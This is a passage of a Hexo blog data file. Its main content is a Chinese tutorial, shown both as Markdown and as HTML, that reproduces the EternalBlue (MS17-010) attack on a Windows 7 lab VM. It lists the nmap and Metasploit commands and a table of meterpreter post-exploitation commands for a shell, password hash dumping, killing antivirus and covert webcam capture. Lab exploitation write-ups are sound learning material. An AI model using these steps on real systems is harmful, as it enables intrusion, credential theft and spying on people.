src=\"/2023/12/10/cronolog/2.png\" alt=\"ErrorLog\"></p>\n<h3 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h3><p>配置完成之后，使用<code>httpd -t</code>检查 Apache 语法，检查无误，使用<code>apachectl graceful</code>重新启动服务。</p>\n<p>之后在<code>/var/log/httpd</code>目录下就可以看到例如 error_20231210.log 这样的 log 文件，然后使用 curl 命令或者浏览器重新访问网站就会自动生成 access_20231210.log 这样的文件。</p>\n<p><img src=\"/2023/12/10/cronolog/3.png\" alt=\"ErrorLog\"></p>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>以上就可以实现访问日志和错误日志以天为单位进行切割保存，当然 cronolog 也支持按照小时进行切割，在双十一或者春运等特殊日期某访问量突然增多的情况下，可以按照小时进行切割。</p>"},{"title":"永恒之蓝复现以及简单的后渗透信息收集","date":"2023-04-16T07:34:29.000Z","_content":"\n\n### 环境准备\n\n首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。\n\n<!-- more -->\n\n### 网络准备\n\n必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。\n\n### 攻击开始\n\n1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。\n\n```bash\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![扫描域内主机](./crypto/1.png)\n\n可以看到有一个***192.168.20.129***的主机可用，开启了445端口。我们就对这个主机进行攻击。\n\n2. windows验证一下，发现windows获取的IP确实是***192.168.20.129***\n\n![windows验证](./crypto//2.png)\n\n3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。\n\n```bash\n    # msfconsole -q  \n```\n\n> -q 选项不再继续打印工具启动时的图形文字\n\n> 运行之后是这样的效果\n\n![msfconsole](./crypto/3.png)\n\n4. 执行以下命令，搜索可以利用的漏洞工具\n\n```bash\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. 选择序号为0的漏洞进行攻击，分别执行以下代码\n\n```bash\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。\n\n效果图如下：\n\n![开始攻击](./crypto/5.png)\n\n6. 稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter>**，入侵完成，我们可以用命令进行对windows主机的任何操作。\n\n|命令|功能|\n|:---:|:---:|\n|shell|启动靶机主机的cmd|\n|screenshot|对靶机进行屏幕截图|\n|webcam_list|列出摄像头|\n|webcam_snap|利用靶机摄像头拍照|\n|webcam_stream|利用靶机摄像头拍视频|\n|getuid|获取登录用户|\n|getsystem|获取磁盘信息|\n|hashdump|获取密码的哈希值|\n|kill|杀掉进程|\n|download|下载文件|\n|upload|上传文件|\n|run killav|关闭杀软|\n|run post/windows/manage/killava|关闭杀软|\n|run post/windows/gather/checkkvm|检查是否是虚拟机|\n|run post/windows/gather/enum_services|列出所有的服务|\n|run post/windows/gather/enum_applications|列出运行的程序|\n|run post/windows/gather/enum_patches|列出打的补丁|\n|run post/windows/gather/dumplinks|列出最近的操作|\n\n\n7. 以下是利用上述命令实现的一些效果图\n\n* 使用shell\n\n```bash\n    meterpreter > shell\n```\n> 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。\n\n![帅哥](./crypto/6.png)\n\n* 屏幕截图，运行以下命令\n\n```bash\n    meterpreter > screenshot\n```\n\n运行成功后桌面上会多了一张windows的屏幕截图\n\n![帅哥](./crypto/7.png)\n\n* 上传文件\n\n上传这一张照片\n\n![帅哥](./crypto/8.png)\n\n执行以下命令\n\n```bash\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![帅哥](./crypto/9.png)\n\n显示上传成功，然后去windows主机验证。\n\n![帅哥](./crypto/10.png)\n\n上传成功，windows正常查看。\n\n* 调用网络摄像头，运行以下命令\n\n```bash\n    meterpreter > webcam_stream\n```\n\n![帅哥](./crypto/11.png)\n\n> kali 成功调用到了windows7的摄像头\n\n### 写在后面的话\n\n网络并不是法外之地，且行且珍惜。","source":"_posts/crypto.md","raw":"---\ntitle: 永恒之蓝复现以及简单的后渗透信息收集\ndate: 2023-04-16 15:34:29\ncategories: 技术\ntags:\n    - 网络安全\n# description: 网络安全，有点意思\n---\n\n\n### 环境准备\n\n首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。\n\n<!-- more -->\n\n### 网络准备\n\n必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。\n\n### 攻击开始\n\n1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。\n\n```bash\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![扫描域内主机](./crypto/1.png)\n\n可以看到有一个***192.168.20.129***的主机可用，开启了445端口。我们就对这个主机进行攻击。\n\n2. windows验证一下，发现windows获取的IP确实是***192.168.20.129***\n\n![windows验证](./crypto//2.png)\n\n3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。\n\n```bash\n    # msfconsole -q  \n```\n\n> -q 选项不再继续打印工具启动时的图形文字\n\n> 运行之后是这样的效果\n\n![msfconsole](./crypto/3.png)\n\n4. 执行以下命令，搜索可以利用的漏洞工具\n\n```bash\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. 选择序号为0的漏洞进行攻击，分别执行以下代码\n\n```bash\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。\n\n效果图如下：\n\n![开始攻击](./crypto/5.png)\n\n6. 稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter>**，入侵完成，我们可以用命令进行对windows主机的任何操作。\n\n|命令|功能|\n|:---:|:---:|\n|shell|启动靶机主机的cmd|\n|screenshot|对靶机进行屏幕截图|\n|webcam_list|列出摄像头|\n|webcam_snap|利用靶机摄像头拍照|\n|webcam_stream|利用靶机摄像头拍视频|\n|getuid|获取登录用户|\n|getsystem|获取磁盘信息|\n|hashdump|获取密码的哈希值|\n|kill|杀掉进程|\n|download|下载文件|\n|upload|上传文件|\n|run killav|关闭杀软|\n|run post/windows/manage/killava|关闭杀软|\n|run post/windows/gather/checkkvm|检查是否是虚拟机|\n|run post/windows/gather/enum_services|列出所有的服务|\n|run post/windows/gather/enum_applications|列出运行的程序|\n|run post/windows/gather/enum_patches|列出打的补丁|\n|run post/windows/gather/dumplinks|列出最近的操作|\n\n\n7. 以下是利用上述命令实现的一些效果图\n\n* 使用shell\n\n```bash\n    meterpreter > shell\n```\n> 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。\n\n![帅哥](./crypto/6.png)\n\n* 屏幕截图，运行以下命令\n\n```bash\n    meterpreter > screenshot\n```\n\n运行成功后桌面上会多了一张windows的屏幕截图\n\n![帅哥](./crypto/7.png)\n\n* 上传文件\n\n上传这一张照片\n\n![帅哥](./crypto/8.png)\n\n执行以下命令\n\n```bash\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![帅哥](./crypto/9.png)\n\n显示上传成功，然后去windows主机验证。\n\n![帅哥](./crypto/10.png)\n\n上传成功，windows正常查看。\n\n* 调用网络摄像头，运行以下命令\n\n```bash\n    meterpreter > webcam_stream\n```\n\n![帅哥](./crypto/11.png)\n\n> kali 成功调用到了windows7的摄像头\n\n### 写在后面的话\n\n网络并不是法外之地，且行且珍惜。","slug":"crypto","published":1,"updated":"2024-05-03T03:55:54.837Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5f9004y7zj32nl56law","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"网络准备\"><a href=\"#网络准备\" class=\"headerlink\" title=\"网络准备\"></a>网络准备</h3><p>必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。</p>\n<h3 id=\"攻击开始\"><a href=\"#攻击开始\" class=\"headerlink\" title=\"攻击开始\"></a>攻击开始</h3><ol>\n<li>使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># nmap -T4 -A -v -Pn 192.168.20.1/24</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2023/04/16/crypto/1.png\" alt=\"扫描域内主机\"></p>\n<p>可以看到有一个<em><strong>192.168.20.129</strong></em>的主机可用，开启了445端口。我们就对这个主机进行攻击。</p>\n<ol start=\"2\">\n<li>windows验证一下，发现windows获取的IP确实是<em><strong>192.168.20.129</strong></em></li>\n</ol>\n<p><img src=\"/2023/04/16/crypto/2.png\" alt=\"windows验证\"></p>\n<ol start=\"3\">\n<li>在kali上使用工具开始攻击，运行以下命令，稍作等待。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># msfconsole -q  </span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>-q 选项不再继续打印工具启动时的图形文字</p>\n</blockquote>\n<blockquote>\n<p>运行之后是这样的效果</p>\n</blockquote>\n<p><img src=\"/2023/04/16/crypto/3.png\" alt=\"msfconsole\"></p>\n<ol start=\"4\">\n<li>执行以下命令，搜索可以利用的漏洞工具</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; search ms17-010</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2023/04/16/crypto/4.png\" alt=\"ms17-010\"></p>\n<ol start=\"5\">\n<li>选择序号为0的漏洞进行攻击，分别执行以下代码</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use 0</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> lhost 192.168.20.50</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> rhost 192.168.20.129</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。</p>\n</blockquote>\n<p>效果图如下：</p>\n<p><img src=\"/2023/04/16/crypto/5.png\" alt=\"开始攻击\"></p>\n<ol start=\"6\">\n<li>稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter&gt;**，入侵完成，我们可以用命令进行对windows主机的任何操作。</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">命令</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">shell</td>\n<td align=\"center\">启动靶机主机的cmd</td>\n</tr>\n<tr>\n<td align=\"center\">screenshot</td>\n<td align=\"center\">对靶机进行屏幕截图</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_list</td>\n<td align=\"center\">列出摄像头</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_snap</td>\n<td align=\"center\">利用靶机摄像头拍照</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_stream</td>\n<td align=\"center\">利用靶机摄像头拍视频</td>\n</tr>\n<tr>\n<td align=\"center\">getuid</td>\n<td align=\"center\">获取登录用户</td>\n</tr>\n<tr>\n<td align=\"center\">getsystem</td>\n<td align=\"center\">获取磁盘信息</td>\n</tr>\n<tr>\n<td align=\"center\">hashdump</td>\n<td align=\"center\">获取密码的哈希值</td>\n</tr>\n<tr>\n<td align=\"center\">kill</td>\n<td align=\"center\">杀掉进程</td>\n</tr>\n<tr>\n<td align=\"center\">download</td>\n<td align=\"center\">下载文件</td>\n</tr>\n<tr>\n<td align=\"center\">upload</td>\n<td align=\"center\">上传文件</td>\n</tr>\n<tr>\n<td align=\"center\">run killav</td>\n<td align=\"center\">关闭杀软</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;manage&#x2F;killava</td>\n<td align=\"center\">关闭杀软</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;checkkvm</td>\n<td align=\"center\">检查是否是虚拟机</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_services</td>\n<td align=\"center\">列出所有的服务</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</td>\n<td align=\"center\">列出运行的程序</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches</td>\n<td align=\"center\">列出打的补丁</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks</td>\n<td align=\"center\">列出最近的操作</td>\n</tr>\n</tbody></table>\n<ol start=\"7\">\n<li>以下是利用上述命令实现的一些效果图</li>\n</ol>\n<ul>\n<li>使用shell</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>运行之后成功进入shell，但是会出现部分乱码，接着输入命令<code>chcp 65001</code>，回车后乱码变正常。</p>\n</blockquote>\n<p><img src=\"/2023/04/16/crypto/6.png\" alt=\"帅哥\"></p>\n<ul>\n<li>屏幕截图，运行以下命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure>\n\n<p>运行成功后桌面上会多了一张windows的屏幕截图</p>\n<p><img src=\"/2023/04/16/crypto/7.png\" alt=\"帅哥\"></p>\n<ul>\n<li>上传文件</li>\n</ul>\n<p>上传这一张照片</p>\n<p><img src=\"/2023/04/16/crypto/8.png\" alt=\"帅哥\"></p>\n<p>执行以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/16/crypto/9.png\" alt=\"帅哥\"></p>\n<p>显示上传成功，然后去windows主机验证。</p>\n<p><img src=\"/2023/04/16/crypto/10.png\" alt=\"帅哥\"></p>\n<p>上传成功，windows正常查看。</p>\n<ul>\n<li>调用网络摄像头，运行以下命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; webcam_stream</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/16/crypto/11.png\" alt=\"帅哥\"></p>\n<blockquote>\n<p>kali 成功调用到了windows7的摄像头</p>\n</blockquote>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>网络并不是法外之地，且行且珍惜。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。</p>","more":"<h3 id=\"网络准备\"><a href=\"#网络准备\" class=\"headerlink\" title=\"网络准备\"></a>网络准备</h3><p>必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。</p>\n<h3 id=\"攻击开始\"><a href=\"#攻击开始\" class=\"headerlink\" title=\"攻击开始\"></a>攻击开始</h3><ol>\n<li>使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># nmap -T4 -A -v -Pn 192.168.20.1/24</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2023/04/16/crypto/1.png\" alt=\"扫描域内主机\"></p>\n<p>可以看到有一个<em><strong>192.168.20.129</strong></em>的主机可用，开启了445端口。我们就对这个主机进行攻击。</p>\n<ol start=\"2\">\n<li>windows验证一下，发现windows获取的IP确实是<em><strong>192.168.20.129</strong></em></li>\n</ol>\n<p><img src=\"/2023/04/16/crypto/2.png\" alt=\"windows验证\"></p>\n<ol start=\"3\">\n<li>在kali上使用工具开始攻击，运行以下命令，稍作等待。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># msfconsole -q  </span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>-q 选项不再继续打印工具启动时的图形文字</p>\n</blockquote>\n<blockquote>\n<p>运行之后是这样的效果</p>\n</blockquote>\n<p><img src=\"/2023/04/16/crypto/3.png\" alt=\"msfconsole\"></p>\n<ol start=\"4\">\n<li>执行以下命令，搜索可以利用的漏洞工具</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; search ms17-010</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2023/04/16/crypto/4.png\" alt=\"ms17-010\"></p>\n<ol start=\"5\">\n<li>选择序号为0的漏洞进行攻击，分别执行以下代码</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use 0</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> lhost 192.168.20.50</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> rhost 192.168.20.129</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。</p>\n</blockquote>\n<p>效果图如下：</p>\n<p><img src=\"/2023/04/16/crypto/5.png\" alt=\"开始攻击\"></p>\n<ol start=\"6\">\n<li>稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter&gt;**，入侵完成，我们可以用命令进行对windows主机的任何操作。</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th align=\"center\">命令</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">shell</td>\n<td align=\"center\">启动靶机主机的cmd</td>\n</tr>\n<tr>\n<td align=\"center\">screenshot</td>\n<td align=\"center\">对靶机进行屏幕截图</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_list</td>\n<td align=\"center\">列出摄像头</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_snap</td>\n<td align=\"center\">利用靶机摄像头拍照</td>\n</tr>\n<tr>\n<td align=\"center\">webcam_stream</td>\n<td align=\"center\">利用靶机摄像头拍视频</td>\n</tr>\n<tr>\n<td align=\"center\">getuid</td>\n<td align=\"center\">获取登录用户</td>\n</tr>\n<tr>\n<td align=\"center\">getsystem</td>\n<td align=\"center\">获取磁盘信息</td>\n</tr>\n<tr>\n<td align=\"center\">hashdump</td>\n<td align=\"center\">获取密码的哈希值</td>\n</tr>\n<tr>\n<td align=\"center\">kill</td>\n<td align=\"center\">杀掉进程</td>\n</tr>\n<tr>\n<td align=\"center\">download</td>\n<td align=\"center\">下载文件</td>\n</tr>\n<tr>\n<td align=\"center\">upload</td>\n<td align=\"center\">上传文件</td>\n</tr>\n<tr>\n<td align=\"center\">run killav</td>\n<td align=\"center\">关闭杀软</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;manage&#x2F;killava</td>\n<td align=\"center\">关闭杀软</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;checkkvm</td>\n<td align=\"center\">检查是否是虚拟机</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_services</td>\n<td align=\"center\">列出所有的服务</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</td>\n<td align=\"center\">列出运行的程序</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches</td>\n<td align=\"center\">列出打的补丁</td>\n</tr>\n<tr>\n<td align=\"center\">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks</td>\n<td align=\"center\">列出最近的操作</td>\n</tr>\n</tbody></table>\n<ol start=\"7\">\n<li>以下是利用上述命令实现的一些效果图</li>\n</ol>\n<ul>\n<li>使用shell</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>运行之后成功进入shell，但是会出现部分乱码，接着输入命令<code>chcp 65001</code>，回车后乱码变正常。</p>\n</blockquote>\n<p><img src=\"/2023/04/16/crypto/6.png\" alt=\"帅哥\"></p>\n<ul>\n<li>屏幕截图，运行以下命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure>\n\n<p>运行成功后桌面上会多了一张windows的屏幕截图</p>\n<p><img src=\"/2023/04/16/crypto/7.png\" alt=\"帅哥\"></p>\n<ul>\n<li>上传文件</li>\n</ul>\n<p>上传这一张照片</p>\n<p><img src=\"/2023/04/16/crypto/8.png\" alt=\"帅哥\"></p>\n<p>执行以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/16/crypto/9.png\" alt=\"帅哥\"></p>\n<p>显示上传成功，然后去windows主机验证。</p>\n<p><img src=\"/2023/04/16/crypto/10.png\" alt=\"帅哥\"></p>\n<p>上传成功，windows正常查看。</p>\n<ul>\n<li>调用网络摄像头，运行以下命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; webcam_stream</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/04/16/crypto/11.png\" alt=\"帅哥\"></p>\n<blockquote>\n<p>kali 成功调用到了windows7的摄像头</p>\n</blockquote>\n<h3 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h3><p>网络并不是法外之地，且行且珍惜。</p>"},{"title":"Docker 如何正确启动 Apache","date":"2023-11-03T13:03:21.000Z","_content":"\n### 问题描述\n\ndocker报错：\nSystem has not been booted with systemd as init system (PID 1). Can‘t operate.\nFailed to connect to bus: Host is down\n\n<!-- more -->\n\n### 解决办法\n\n```bash\n# 运行centos\n# docker run -itd --name centos centos /bin/bash\n\n# 替换为：\n# 获取systemctl权限\ndocker run --privileged -itd --name centos centos /usr/sbin/init\n\n# 进入终端\ndocker exec -it centos /bin/bash\n```","source":"_posts/docker-apache.md","raw":"---\ntitle: Docker 如何正确启动 Apache\ndate: 2023-11-03 21:03:21\ncategories: 技术\ntags:\n  - Docker\n---\n\n### 问题描述\n\ndocker报错：\nSystem has not been booted with systemd as init system (PID 1). Can‘t operate.\nFailed to connect to bus: Host is down\n\n<!-- more -->\n\n### 解决办法\n\n```bash\n# 运行centos\n# docker run -itd --name centos centos /bin/bash\n\n# 替换为：\n# 获取systemctl权限\ndocker run --privileged -itd --name centos centos /usr/sbin/init\n\n# 进入终端\ndocker exec -it centos 